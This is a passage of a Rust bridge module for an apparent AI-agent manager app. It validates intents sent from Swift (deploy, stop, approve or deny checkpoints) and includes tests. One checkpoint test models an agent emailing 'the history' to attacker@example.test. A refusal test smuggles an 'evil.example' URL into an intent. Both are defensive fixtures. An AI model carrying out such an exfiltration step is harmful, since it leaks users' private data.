            checkpoint: CheckpointId::from(ident(checkpoint)?),
            reason,
        }),
        IntentWire::AuthResult { request, outcome } => Ok(Intent::AuthResult {
            request: ident(request)?,
            outcome,
        }),
        IntentWire::DeployTask { id, prompt } => {
            if prompt.len() > MAX_PROMPT_BYTES {
                return Err(BridgeError::PromptTooLong(prompt.len()));
            }
            Ok(Intent::DeployTask {
                agent: agent_id(id)?,
                prompt,
            })
        }
        IntentWire::Stop { id } => Ok(Intent::Stop(agent_id(id)?)),
        IntentWire::SendBack { id } => Ok(Intent::SendBack(agent_id(id)?)),
        IntentWire::Retry { id } => Ok(Intent::Retry(agent_id(id)?)),
        IntentWire::ShowLinked { id, look } => {
            let app = linked_app(&id)?;
            let look = match (app, look) {
                (_, None) => None,
                (LinkedApp::Dot, Some(look)) => {
                    Some(DotLook::from_id(&look).ok_or(BridgeError::BadLinked)?)
                }
                (LinkedApp::Muse, Some(_)) => return Err(BridgeError::BadLinked),
            };
            Ok(Intent::ShowLinked { app, look })
        }
        IntentWire::HideLinked { id } => Ok(Intent::HideLinked(linked_app(&id)?)),
        IntentWire::OpenLinked { id } => Ok(Intent::OpenLinked(linked_app(&id)?)),
        IntentWire::StopAll {} => Ok(Intent::StopAll),
        IntentWire::CorralIdle { idle } => Ok(Intent::CorralIdle(idle)),
        IntentWire::PromptBarEdited {
            seq,
            text,
            cursor,
            selection,
        } => Ok(Intent::PromptBarEdited(bar_edit(
            seq,
            text,
            Some(cursor),
            selection,
        )?)),
        IntentWire::PromptBarSend {
            seq,
            text,
            selection,
            all,
        } => Ok(Intent::PromptBarSend {
            edit: bar_edit(seq, text, None, selection)?,
            how: if all { How::All } else { How::Return },
        }),
        IntentWire::ApproveCheckpoint {
            id,
            checkpoint,
            scope,
            how,
        } => Ok(Intent::ApproveCheckpoint {
            agent: agent_id(id)?,
            checkpoint: CheckpointId::from(ident(checkpoint)?),
            scope: match scope {
                ScopeWire::Once => Scope::Once,
                ScopeWire::ForRun => Scope::ForRun,
            },
            how: gesture(how),
        }),
        IntentWire::DenyCheckpoint {
            id,
            checkpoint,
            note,
        } => {
            if let Some(note) = &note
                && note.len() > MAX_NOTE_BYTES
            {
                return Err(BridgeError::NoteTooLong(note.len()));
            }
            Ok(Intent::DenyCheckpoint {
                agent: agent_id(id)?,
                checkpoint: CheckpointId::from(ident(checkpoint)?),
                note,
            })
        }
        IntentWire::ApproveWithTouchId { id, checkpoint } => Ok(Intent::ApproveWithTouchId {
            agent: agent_id(id)?,
            checkpoint: CheckpointId::from(ident(checkpoint)?),
        }),
        IntentWire::EditCheckpoint {
            id,
            checkpoint,
            changes,
            how,
        } => {
            if changes.is_empty()
                || changes.len() > EDIT_MAX_FIELDS
                || changes.keys().any(|key| key.len() > MAX_EDIT_KEY_BYTES)
            {
                return Err(BridgeError::BadEdit);
            }
            Ok(Intent::EditCheckpoint {
                agent: agent_id(id)?,
                checkpoint: CheckpointId::from(ident(checkpoint)?),
                changes,
                how: gesture(how),
            })
        }
    }
}

fn gesture(how: CardGesture) -> Approval {
    match how {
        CardGesture::Click => Approval::Click,
        CardGesture::Keyboard => Approval::Keyboard,
    }
}

fn linked_app(id: &str) -> Result<LinkedApp, BridgeError> {
    LinkedApp::from_id(id).ok_or(BridgeError::BadLinked)
}

/// The prompt bar's text, cursor and selection from Swift, bounded. With no cursor, it's at the end.
fn bar_edit(
    seq: u32,
    text: String,
    cursor: Option<u64>,
    selection: Vec<String>,
) -> Result<BarEdit, BridgeError> {
    if text.len() > MAX_PROMPT_BYTES {
        return Err(BridgeError::PromptTooLong(text.len()));
    }
    if selection.len() > MAX_SHOWN {
        return Err(BridgeError::BadGroup(selection.len()));
    }
    let mut picked: Vec<AgentId> = Vec::with_capacity(selection.len());
    for id in selection {
        let id = agent_id(id)?;
        if !picked.contains(&id) {
            picked.push(id);
        }
    }
    let mut at = cursor.map_or(text.len(), |c| {
        usize::try_from(c).map_or(text.len(), |c| c.min(text.len()))
    });
    while !text.is_char_boundary(at) {
        at -= 1;
    }
    Ok(BarEdit {
        seq,
        text,
        cursor: at,
        selection: picked,
    })
}

fn agent_id(id: String) -> Result<AgentId, BridgeError> {
    ident(id).map(AgentId::from)
}

/// An ID from Swift: non-empty, at most [`MAX_ID_LEN`] characters, no whitespace or controls.
fn ident(id: String) -> Result<String, BridgeError> {
    let valid = !id.is_empty()
        && id.chars().count() <= MAX_ID_LEN
        && !id.chars().any(|c| c.is_control() || c.is_whitespace());
    if valid {
        Ok(id)
    } else {
        Err(BridgeError::BadId)
    }
}

/// Status codes returned by the Swift entry points (`CorralBridgeStatus` in `CorralBridge.swift`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, thiserror::Error)]
pub enum Status {
    /// Called off the main thread; nothing happened.
    #[error("CorralNative must be called on the main thread")]
    NotMainThread,
    /// `start` was called twice.
    #[error("the corral is already started")]
    AlreadyStarted,
    /// Called before `start`.
    #[error("the corral isn't started")]
    NotStarted,
    /// Swift refused the payload; it keeps showing the previous roster.
    #[error("CorralNative rejected the payload")]
    Rejected,
    /// A null pointer was passed.
    #[error("null argument")]
    NullArgument,
    /// A code this build doesn't know (an ABI mismatch).
    #[error("unknown CorralNative status {0}")]
    Unknown(i32),
}

impl Status {
    /// Maps a raw status code; `Ok(())` for success.
    pub fn check(code: i32) -> Result<(), Status> {
        match code {
            0 => Ok(()),
            1 => Err(Status::NotMainThread),
            2 => Err(Status::AlreadyStarted),
            3 => Err(Status::NotStarted),
            4 => Err(Status::Rejected),
            5 => Err(Status::NullArgument),
            other => Err(Status::Unknown(other)),
        }
    }
}

/// Fake agents for tests (cowboy names: no real products, ADR-005).
#[cfg(test)]
pub fn demo_roster(count: usize) -> RosterSnapshot {
    const NAMES: [(&str, &str); 10] = [
        ("Scout", "Sc"),
        ("Ranger", "Rg"),
        ("Drover", "Dv"),
        ("Wrangler", "Wr"),
        ("Farrier", "Fa"),
        ("Trailhand", "Th"),
        ("Cookie", "Ck"),
        ("Rustler", "Ru"),
        ("Foreman", "Fo"),
        ("Greenhorn", "Gh"),
    ];
    const STATUSES: [DropStatus; 5] = [
        DropStatus::Available,
        DropStatus::Working,
        DropStatus::NeedsYou,
        DropStatus::Done,
        DropStatus::Error,
    ];
    let agents = NAMES
        .iter()
        .zip(STATUSES.iter().cycle())
        .take(count)
        .map(|((name, monogram), status)| RosterAgent {
            id: AgentId::from(name.to_lowercase()),
            name: (*name).to_owned(),
            monogram: (*monogram).to_owned(),
            status: *status,
            logo: None,
            linked: None,
        })
        .collect();
    RosterSnapshot::ranked(agents)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::Value;

    const ROSTER: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-v1.json");
    const OPEN: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-open-agent-v1.json");
    const DEPLOY: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-deploy-v1.json");
    const PROMPT: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-summon-prompt-bar-v1.json"
    );

    const NOTIFY: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/notify-v1.json");
    const AUTH: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/authenticate-v1.json");
    const NOTE_ACTION: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-notification-action-v1.json"
    );
    const NOTE_FAILED: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-notification-failed-v1.json"
    );
    const AUTH_RESULT: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-auth-result-v1.json");

    fn json(bytes: &[u8]) -> Value {
        serde_json::from_slice(bytes).unwrap()
    }

    #[test]
    fn tp_bridge_01_roster_matches_the_fixture_swift_decodes() {
        let sent = demo_roster(3).to_bytes().unwrap();
        assert_eq!(json(&sent), json(ROSTER.as_bytes()));
    }

    #[test]
    fn tp_bridge_01_roster_keeps_rank_order_and_shows_at_most_eight() {
        let snapshot = demo_roster(10);
        let v = json(&snapshot.to_bytes().unwrap());
        let ids: Vec<&str> = v["agents"]
            .as_array()
            .unwrap()
            .iter()
            .map(|a| a["id"].as_str().unwrap())
            .collect();
        assert_eq!(
            ids,
            [
                "scout",
                "ranger",
                "drover",
                "wrangler",
                "farrier",
                "trailhand",
                "cookie",
                "rustler"
            ]
        );
        assert_eq!(v["hidden"], 2);
    }

    #[test]
    fn tp_bridge_02_swift_intents_arrive_typed() {
        assert_eq!(
            decode_intent(OPEN.as_bytes()).unwrap(),
            Intent::OpenAgent(AgentId::from("scout"))
        );
        assert_eq!(
            decode_intent(DEPLOY.as_bytes()).unwrap(),
            Intent::Deploy(vec![AgentId::from("scout"), AgentId::from("drover")])
        );
        assert_eq!(
            decode_intent(PROMPT.as_bytes()).unwrap(),
            Intent::SummonPromptBar
        );
    }

    #[test]
    fn tp_bridge_02_bad_intents_are_refused() {
        let refused = |s: &str| decode_intent(s.as_bytes()).is_err();
        assert!(refused(""));
        assert!(refused("{"));
        assert!(refused(r#"{"v":1,"intent":{"kind":"deleteEverything"}}"#));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"openAgent","id":"a","extra":1}}"#
        ));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"openAgent","id":"a"},"extra":1}"#
        ));
        assert!(refused(r#"{"v":2,"intent":{"kind":"summonPromptBar"}}"#));
        assert!(refused(r#"{"v":1,"intent":{"kind":"openAgent","id":""}}"#));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"openAgent","id":"a\u0000b"}}"#
        ));
        assert!(refused(r#"{"v":1,"intent":{"kind":"deploy","ids":[]}}"#));
        let nine: Vec<String> = (0..9).map(|i| format!("\"a{i}\"")).collect();
        let nine = format!(
            r#"{{"v":1,"intent":{{"kind":"deploy","ids":[{}]}}}}"#,
            nine.join(",")
        );
        assert!(refused(&nine));
        let long = "x".repeat(MAX_ID_LEN + 1);
        assert!(refused(&format!(
            r#"{{"v":1,"intent":{{"kind":"openAgent","id":"{long}"}}}}"#
        )));
        assert!(matches!(
            decode_intent(&vec![b' '; MAX_INTENT_BYTES + 1]),
            Err(BridgeError::TooLarge(_))
        ));
    }

    #[test]
    fn tp_bridge_02_duplicate_ids_in_a_deploy_collapse() {
        let s = r#"{"v":1,"intent":{"kind":"deploy","ids":["a","b","a"]}}"#;
        assert_eq!(
            decode_intent(s.as_bytes()).unwrap(),
            Intent::Deploy(vec![AgentId::from("a"), AgentId::from("b")])
        );
    }

    #[test]
    fn status_codes_match_corral_bridge_swift() {
        assert_eq!(Status::check(0), Ok(()));
        assert_eq!(Status::check(1), Err(Status::NotMainThread));
        assert_eq!(Status::check(2), Err(Status::AlreadyStarted));
        assert_eq!(Status::check(3), Err(Status::NotStarted));
        assert_eq!(Status::check(4), Err(Status::Rejected));
        assert_eq!(Status::check(5), Err(Status::NullArgument));
        assert_eq!(Status::check(42), Err(Status::Unknown(42)));
    }

    // TP-BRIDGE-04: checkpoint notifications and Touch ID (ADR-001).

    #[test]
    fn tp_bridge_04_checkpoint_notification_matches_the_fixture_swift_decodes() {
        let n = NotificationRequest::new(
            CheckpointId::from("cp-1"),
            "n-1",
            AgentId::from("scout"),
            "Scout needs you",
            "Send the weekly summary email to 3 people?",
            vec![Offer::Approve, Offer::Deny, Offer::Open],
        );
        assert_eq!(json(&n.to_bytes().unwrap()), json(NOTIFY.as_bytes()));
    }

    #[test]
    fn tp_bridge_04_touch_id_request_matches_the_fixture_swift_decodes() {
        let a = AuthRequest::new("auth-1", "approve Scout spending $4.00");
        assert_eq!(json(&a.to_bytes().unwrap()), json(AUTH.as_bytes()));
    }

    #[test]
    fn tp_bridge_04_notification_and_touch_id_results_arrive_typed() {
        assert_eq!(
            decode_intent(NOTE_ACTION.as_bytes()).unwrap(),
            Intent::NotificationAction {
                checkpoint: CheckpointId::from("cp-1"),
                nonce: "n-1".into(),
                action: NoteAction::Approve,
            }
        );
        assert_eq!(
            decode_intent(NOTE_FAILED.as_bytes()).unwrap(),
            Intent::NotificationFailed {
                checkpoint: CheckpointId::from("cp-1"),
                reason: NoteFailure::NotAuthorized,
            }
        );
        assert_eq!(
            decode_intent(AUTH_RESULT.as_bytes()).unwrap(),
            Intent::AuthResult {
                request: "auth-1".into(),
                outcome: AuthOutcome::Ok,
            }
        );
    }

    #[test]
    fn tp_bridge_04_bad_checkpoint_intents_are_refused() {
        let refused = |s: &str| decode_intent(s.as_bytes()).is_err();
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"notificationAction","checkpoint":"cp","nonce":"n","action":"approveAll"}}"#
        ));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"notificationAction","checkpoint":"","nonce":"n","action":"approve"}}"#
        ));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"notificationAction","checkpoint":"cp","nonce":"n n","action":"approve"}}"#
        ));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"notificationAction","checkpoint":"cp","action":"approve"}}"#
        ));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"authResult","request":"a","outcome":"probably"}}"#
        ));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"authResult","request":"a","outcome":"ok","by":"x"}}"#
        ));
    }

    // SK-2b: the roster comes from the core's corral view.

    #[test]
    fn tp_bridge_01_roster_from_the_corral_view_matches_the_fixture() {
        use corral_core::corral_view::{AgentCard, DropView};
        let drop = |id: &str, name: &str, monogram: &str, state| DropView {
            agent: AgentCard {
                id: AgentId::from(id),
                name: name.into(),
                monogram: monogram.into(),
            },
            state,
        };
        let view = CorralView {
            drops: vec![
                drop("scout", "Scout", "Sc", DropState::Available),
                drop("ranger", "Ranger", "Rg", DropState::Working),
                drop("drover", "Drover", "Dv", DropState::NeedsYou),
            ],
            hidden: 0,
        };
        let sent = RosterSnapshot::from(&view).to_bytes().unwrap();
        assert_eq!(json(&sent), json(ROSTER.as_bytes()));

        let hidden = CorralView { hidden: 5, ..view };
        assert_eq!(
            json(&RosterSnapshot::from(&hidden).to_bytes().unwrap())["hidden"],
            5
        );
    }

    #[test]
    fn tp_bridge_01_every_drop_state_has_a_drop_status() {
        let pairs = [
            (DropState::Available, "available"),
            (DropState::Working, "working"),
            (DropState::NeedsYou, "needsYou"),
            (DropState::Done, "done"),
            (DropState::Error, "error"),
        ];
        for (state, wire) in pairs {
            assert_eq!(serde_json::to_value(DropStatus::from(state)).unwrap(), wire);
        }
    }
}

/// SK-6: tasks from a drop, and run cards (TP-SKEL-03..05).
#[cfg(test)]
mod skeleton_tests {
    use super::*;
    use corral_core::controls::MAX_PROMPT_BYTES;
    use corral_core::corral_view::{AgentCard, DropView};
    use corral_core::event::*;
    use corral_core::ids::{RunId, SessionId, SpanId};
    use corral_core::run_card::RunCards;
    use serde_json::Value;

    const CARDS: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-cards-v1.json");
    const DEPLOY_TASK: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-deploy-task-v1.json");
    const STOP: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-stop-v1.json");
    const SEND_BACK: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-send-back-v1.json");
    const RETRY: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-retry-v1.json");

    fn json(bytes: &[u8]) -> Value {
        serde_json::from_slice(bytes).expect("json")
    }

    fn ev(run: &str, ts: u64, body: EventBody) -> Event {
        Event {
            run_id: RunId::from(run),
            seq: 1,
            ts,
            span_id: SpanId::from("span"),
            parent_span_id: None,
            body,
        }
    }

    fn queued(run: &str, agent: &str, prompt: &str) -> Event {
        ev(
            run,
            0,
            EventBody::RunQueued(RunQueued {
                agent_id: AgentId::from(agent),
                session_id: SessionId::from(format!("s-{run}")),
                prompt: prompt.into(),
            }),
        )
    }

    fn started(run: &str, ts: u64) -> Event {
        ev(
            run,
            ts,
            EventBody::RunStarted(RunStarted {
                adapter: "xai".into(),
            }),
        )
    }

    fn drop(id: &str, name: &str, monogram: &str, state: DropState) -> DropView {
        DropView {
            agent: AgentCard {
                id: AgentId::from(id),
                name: name.into(),
                monogram: monogram.into(),
            },
            state,
        }
    }

    /// Three runs: one working, one done, one failed, as the fixture shows them at t = 4 s.
    fn three_cards() -> (CorralView, RunCards) {
        let mut cards = RunCards::default();
        let events = [
            queued("r1", "scout", "What is the capital of France?"),
            started("r1", 1_000),
            queued("r2", "ranger", "Say hello."),
            started("r2", 1_000),
            ev(
                "r2",
                1_500,
                EventBody::ModelResponse(ModelResponse {
                    text: "Hello! How can I help?".into(),
                    finish_reason: None,
                }),
            ),
            ev(
                "r2",
                1_600,
                EventBody::UsageReported(UsageReported {
                    input_tokens: 12,
                    output_tokens: 47,
                    cost_micro_usd: 306,
                }),
            ),
            ev(
                "r2",
                2_000,
                EventBody::RunCompleted(RunCompleted { summary: None }),
            ),
            queued("r3", "drover", "Say hello."),
            started("r3", 1_000),
            ev(
                "r3",
                3_000,
                EventBody::RunFailed(RunFailed {
                    reason: FailureReason::Provider,
                    message: "Add your xAI key in Settings.".into(),
                }),
            ),
        ];
        for e in &events {
            cards.observe(e).expect("legal");
        }
        let view = CorralView {
            drops: vec![
                drop("scout", "Scout", "Sc", DropState::Working),
                drop("ranger", "Ranger", "Rg", DropState::Done),
                drop("drover", "Drover", "Dv", DropState::Error),
            ],
            hidden: 0,
        };
        (view, cards)
    }

    #[test]
    fn tp_skel_04_the_roster_carries_each_drops_card_as_the_fixture_swift_decodes() {
        let (view, cards) = three_cards();
        let sent = RosterSnapshot::with_cards(&view, &cards, 4_000)
            .to_bytes()
            .expect("encode");
        assert_eq!(json(&sent), json(CARDS.as_bytes()));
    }

    #[test]
    fn tp_skel_04_cards_go_only_with_shown_drops() {
        let (mut view, cards) = three_cards();
        view.drops.truncate(1);
        let v = json(
            &RosterSnapshot::with_cards(&view, &cards, 4_000)
                .to_bytes()
                .expect("encode"),
        );
        let ids: Vec<&str> = v["cards"]
            .as_array()
            .expect("cards")
            .iter()
            .map(|c| c["id"].as_str().expect("id"))
            .collect();
        assert_eq!(ids, ["scout"]);
    }

    #[test]
    fn tp_skel_04_a_roster_with_no_cards_is_still_roster_v1() {
        let view = CorralView {
            drops: vec![drop("scout", "Scout", "Sc", DropState::Available)],
            hidden: 0,
        };
        let v = json(
            &RosterSnapshot::with_cards(&view, &RunCards::default(), 0)
                .to_bytes()
                .expect("encode"),
        );
        assert!(v.get("cards").is_none(), "{v}");
    }

    #[test]
    fn tp_skel_03_tasks_stop_send_back_and_retry_arrive_typed() {
        assert_eq!(
            decode_intent(DEPLOY_TASK.as_bytes()).expect("deployTask"),
            Intent::DeployTask {
                agent: AgentId::from("scout"),
                prompt: "What is the capital of France?".into(),
            }
        );
        assert_eq!(
            decode_intent(STOP.as_bytes()).expect("stop"),
            Intent::Stop(AgentId::from("scout"))
        );
        assert_eq!(
            decode_intent(SEND_BACK.as_bytes()).expect("sendBack"),
            Intent::SendBack(AgentId::from("scout"))
        );
        assert_eq!(
            decode_intent(RETRY.as_bytes()).expect("retry"),
            Intent::Retry(AgentId::from("scout"))
        );
    }

    #[test]
    fn tp_skel_03_bad_task_intents_are_refused() {
        let refused = |s: &str| decode_intent(s.as_bytes()).is_err();
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"deployTask","id":"scout"}}"#
        ));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"deployTask","id":"","prompt":"hi"}}"#
        ));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"deployTask","id":"scout","prompt":"hi","model":"x"}}"#
        ));
        assert!(refused(r#"{"v":1,"intent":{"kind":"stop"}}"#));
        assert!(refused(
            r#"{"v":1,"intent":{"kind":"sendBack","id":"a b"}}"#
        ));
        let long = "a".repeat(MAX_PROMPT_BYTES + 1);
        assert!(matches!(
            decode_intent(
                format!(
                    r#"{{"v":1,"intent":{{"kind":"deployTask","id":"scout","prompt":"{long}"}}}}"#
                )
                .as_bytes()
            ),
            Err(BridgeError::PromptTooLong(_))
        ));
    }

    // A full-size prompt, with room for the envelope, fits in one intent.
    const _: () = assert!(MAX_PROMPT_BYTES + 256 <= MAX_INTENT_BYTES);
}

#[cfg(test)]
mod logo_tests {
    use super::*;
    use corral_core::corral_view::{AgentCard, DropView};
    use serde_json::Value;

    const LOGOS: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-logos-v1.json");
    const CLAUDE_LOGO: &str = "/Users/you/Library/Application Support/Corral/logos/anthropic.png";

    fn json(bytes: &[u8]) -> Value {
        serde_json::from_slice(bytes).expect("json")
    }

    fn view() -> CorralView {
        let drop = |id: &str, name: &str, monogram: &str, state| DropView {
            agent: AgentCard {
                id: AgentId::from(id),
                name: name.into(),
                monogram: monogram.into(),
            },
            state,
        };
        CorralView {
            drops: vec![
                drop("claude", "Claude", "C", DropState::Available),
                drop("grok", "Grok", "G", DropState::Working),
            ],
            hidden: 0,
        }
    }

    #[test]
    fn tp_logo_09_the_roster_carries_each_drops_logo_as_the_fixture_swift_decodes() {
        let sent = RosterSnapshot::from(&view())
            .with_logos(|id| (id.as_str() == "claude").then(|| CLAUDE_LOGO.to_owned()))
            .to_bytes()
            .expect("encode");
        assert_eq!(json(&sent), json(LOGOS.as_bytes()));
    }

    #[test]
    fn tp_logo_09_a_roster_without_logos_has_no_logo_keys() {
        let v = json(
            &RosterSnapshot::from(&view())
                .with_logos(|_| None)
                .to_bytes()
                .expect("encode"),
        );
        for agent in v["agents"].as_array().expect("agents") {
            assert!(agent.get("logo").is_none(), "{agent}");
        }
    }
}

#[cfg(test)]
mod linked_tests {
    use super::*;
    use corral_adapters::linked::{DotLook, LinkedApp, LinkedSettings};
    use corral_core::corral_view::{AgentCard, DropView};
    use serde_json::Value;

    const ROSTER_LINKED: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-linked-v1.json");
    const SHOW: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-show-linked-v1.json");
    const HIDE: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-hide-linked-v1.json");
    const OPEN: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-open-linked-v1.json");

    fn json(bytes: &[u8]) -> Value {
        serde_json::from_slice(bytes).expect("json")
    }

    fn view() -> CorralView {
        let drop = |card: AgentCard| DropView {
            agent: card,
            state: DropState::Available,
        };
        CorralView {
            drops: vec![
                drop(AgentCard {
                    id: AgentId::from("grok"),
                    name: "Grok".into(),
                    monogram: "G".into(),
                }),
                drop(LinkedApp::Muse.agent_card()),
                drop(LinkedApp::Dot.agent_card()),
            ],
            hidden: 0,
        }
    }

    fn refused(text: &str) -> bool {
        decode_intent(text.as_bytes()).is_err()
    }

    #[test]
    fn tp_link_03_the_roster_marks_linked_drops_as_the_fixture_swift_decodes() {
        let settings = LinkedSettings {
            muse: true,
            dot: Some(DotLook::Felipe),
        };
        let sent = RosterSnapshot::from(&view())
            .with_linked(&settings)
            .to_bytes()
            .expect("encode");
        assert_eq!(json(&sent), json(ROSTER_LINKED.as_bytes()));
    }

    #[test]
    fn tp_link_03_with_nothing_linked_the_roster_is_unchanged() {
        let view = CorralView {
            drops: vec![DropView {
                agent: AgentCard {
                    id: AgentId::from("grok"),
                    name: "Grok".into(),
                    monogram: "G".into(),
                },
                state: DropState::Available,
            }],
            hidden: 0,
        };
        let plain = RosterSnapshot::from(&view).to_bytes().expect("encode");
        let linked = RosterSnapshot::from(&view)
            .with_linked(&LinkedSettings::default())
            .to_bytes()
            .expect("encode");
        assert_eq!(json(&plain), json(&linked));
        assert!(json(&linked).get("links").is_none());
    }

    #[test]
    fn tp_link_04_menu_and_card_intents_arrive_typed() {
        assert_eq!(
            decode_intent(SHOW.as_bytes()).expect("showLinked"),
            Intent::ShowLinked {
                app: LinkedApp::Dot,
                look: Some(DotLook::Felipe)
            }
        );
        assert_eq!(
            decode_intent(HIDE.as_bytes()).expect("hideLinked"),
            Intent::HideLinked(LinkedApp::Muse)
        );
        assert_eq!(
            decode_intent(OPEN.as_bytes()).expect("openLinked"),
            Intent::OpenLinked(LinkedApp::Muse)
        );
        assert_eq!(
            decode_intent(br#"{"v":1,"intent":{"kind":"showLinked","id":"muse"}}"#)
                .expect("show Muse"),
            Intent::ShowLinked {
                app: LinkedApp::Muse,
                look: None
            }
        );
    }

    #[test]
    fn tp_link_04_unknown_apps_and_looks_are_refused() {
        for bad in [
            r#"{"v":1,"intent":{"kind":"openLinked","id":"grok"}}"#,
            r#"{"v":1,"intent":{"kind":"openLinked","id":"Muse"}}"#,
            r#"{"v":1,"intent":{"kind":"hideLinked","id":""}}"#,
            r#"{"v":1,"intent":{"kind":"showLinked","id":"dot","look":"nobody"}}"#,
            r#"{"v":1,"intent":{"kind":"showLinked","id":"muse","look":"felipe"}}"#,
            r#"{"v":1,"intent":{"kind":"showLinked","id":"dot","look":"felipe","url":"https://x"}}"#,
            r#"{"v":1,"intent":{"kind":"openLinked","id":"muse","url":"https://evil.example"}}"#,
        ] {
            assert!(refused(bad), "{bad}");
        }
    }
}

#[cfg(test)]
mod stop_all_tests {
    use super::*;

    const STOP_ALL: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-stop-all-v1.json");

    #[test]
    fn tp_sup_02_stop_all_from_the_corral_menu_arrives_typed() {
        assert_eq!(
            decode_intent(STOP_ALL.as_bytes()).expect("stopAll"),
            Intent::StopAll
        );
    }

    #[test]
    fn tp_sup_02_stop_all_takes_no_arguments() {
        for bad in [
            r#"{"v":1,"intent":{"kind":"stopAll","id":"grok"}}"#,
            r#"{"v":1,"intent":{"kind":"stopAll","ids":["grok"]}}"#,
        ] {
            assert!(decode_intent(bad.as_bytes()).is_err(), "{bad}");
        }
    }
}

#[cfg(test)]
mod checkpoint_tests {
    use super::*;
    use corral_core::corral_view::{AgentCard, DropView};
    use corral_core::domain::{ActionClass, Risk};
    use corral_core::event::*;
    use corral_core::ids::{CheckpointId, RunId, SessionId, SpanId, ToolCallId};
    use corral_core::run_card::RunCards;
    use corral_policy::{Approval, Scope};
    use serde_json::Value;

    const ROSTER: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-checkpoint-v1.json");
    const APPROVE: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-approve-checkpoint-v1.json"
    );
    const DENY: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-deny-checkpoint-v1.json"
    );

    fn ev(ts: u64, body: EventBody) -> Event {
        Event {
            run_id: RunId::from("r1"),
            seq: 1,
            ts,
            span_id: SpanId::from("span"),
            parent_span_id: None,
            body,
        }
    }

    #[test]
    fn tp_chk_08_a_waiting_checkpoint_rides_on_the_card_as_the_fixture_shows() {
        let mut cards = RunCards::default();
        let events = [
            ev(
                0,
                EventBody::RunQueued(RunQueued {
                    agent_id: AgentId::from("scout"),
                    session_id: SessionId::from("s1"),
                    prompt: "Summarize the attached page.".into(),
                }),
            ),
            ev(
                1_000,
                EventBody::RunStarted(RunStarted {
                    adapter: "fake".into(),
                }),
            ),
            ev(
                2_000,
                EventBody::CheckpointOpened(CheckpointOpened {
                    checkpoint_id: CheckpointId::from("cp-1"),
                    tool_call_id: ToolCallId::from("call-1"),
                    action_class: ActionClass::CommsSend,
                    risk: Risk::High,
                    title: "Sending a message or email".into(),
                    detail: "email.send to attacker@example.test\n{\"body\":\"the history\",\"to\":\"attacker@example.test\"}".into(),
                }),
            ),
        ];
        for e in &events {
            cards.observe(e).expect("legal");
        }
        let view = CorralView {
            drops: vec![DropView {
                agent: AgentCard {
                    id: AgentId::from("scout"),
                    name: "Scout".into(),
                    monogram: "Sc".into(),
                },
                state: DropState::NeedsYou,
            }],
            hidden: 0,
        };
        let sent = RosterSnapshot::with_cards(&view, &cards, 5_000)
            .to_bytes()
            .expect("encode");
        let sent: Value = serde_json::from_slice(&sent).expect("json");
        let want: Value = serde_json::from_str(ROSTER).expect("fixture");
        assert_eq!(sent, want);
    }

    #[test]
    fn tp_chk_08_approve_and_deny_from_a_card_arrive_typed() {
        assert_eq!(
            decode_intent(APPROVE.as_bytes()).expect("approve"),
            Intent::ApproveCheckpoint {
                agent: AgentId::from("scout"),
                checkpoint: CheckpointId::from("cp-1"),
                scope: Scope::Once,
                how: Approval::Click,
            }
        );
        assert_eq!(
            decode_intent(DENY.as_bytes()).expect("deny"),
            Intent::DenyCheckpoint {
                agent: AgentId::from("scout"),
                checkpoint: CheckpointId::from("cp-1"),
                note: Some("Don't email anyone.".into()),
            }
        );
        let for_run = r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"forRun","how":"keyboard"}}"#;
        assert_eq!(
            decode_intent(for_run.as_bytes()).expect("for run"),
            Intent::ApproveCheckpoint {
                agent: AgentId::from("scout"),
                checkpoint: CheckpointId::from("cp-1"),
                scope: Scope::ForRun,
                how: Approval::Keyboard,
            }
        );
        let no_note =
            r#"{"v":1,"intent":{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1"}}"#;
        assert_eq!(
            decode_intent(no_note.as_bytes()).expect("no note"),
            Intent::DenyCheckpoint {
                agent: AgentId::from("scout"),
                checkpoint: CheckpointId::from("cp-1"),
                note: None,
            }
        );
    }

    #[test]
    fn tp_chk_08_touch_id_and_voice_never_come_from_a_card_and_bad_answers_are_refused() {
        let note = "n".repeat(MAX_NOTE_BYTES + 1);
        let long_note = format!(
            r#"{{"v":1,"intent":{{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"{note}"}}}}"#
        );
        let bad = [
